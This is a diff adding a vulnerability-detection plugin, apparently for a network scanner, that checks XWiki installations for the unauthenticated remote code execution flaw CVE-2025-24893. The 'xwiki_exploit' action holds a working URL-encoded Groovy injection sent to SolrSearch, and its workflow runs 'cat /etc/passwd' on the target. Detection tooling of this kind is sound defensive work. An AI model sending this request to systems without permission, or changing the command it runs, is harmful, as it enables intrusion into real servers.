@@ -1,0 +1,92 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "XWiki_CVE_2025_24893"
+  author: "a3vX"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-24893"
+  }
+  severity: CRITICAL
+  title: "Unauthenticated Remote Code Execution (SolrSearch)"
+  description: "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Any guest can perform arbitrary remote code execution through a request to `SolrSearch`. This impacts the confidentiality, integrity and availability of the whole XWiki installation."
+  recommendation: "Upgrade to XWiki 15.10.11, 16.4.1 or 16.5.0RC1."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-24893"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "xwiki_fingerprinting"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "<link rel=\"canonical\" href=\"/([^\"]*)bin/view/Main/\" />"
+            variable_name: "basePath"
+          }
+        ]
+      }
+    }
+  }
+}
+
+
+actions: {
+  name: "xwiki_exploit"
+  http_request: {
+    method: GET
+    uri: "/{{ basePath }}bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28{{ payload }}%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ expectedRegex }}" }
+        ]
+      }
+    }
+  }
+}
+
+                   
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+	# Linux specific payload
+    { name: "payload" value: "%27cat+/etc/passwd%27.execute().text" },
+    { name: "expectedRegex" value: "root:x:0:0:root" }
+  ]
+
+  actions: [
+    "xwiki_fingerprinting",
+    "xwiki_exploit"
+  ]
+}
+
+
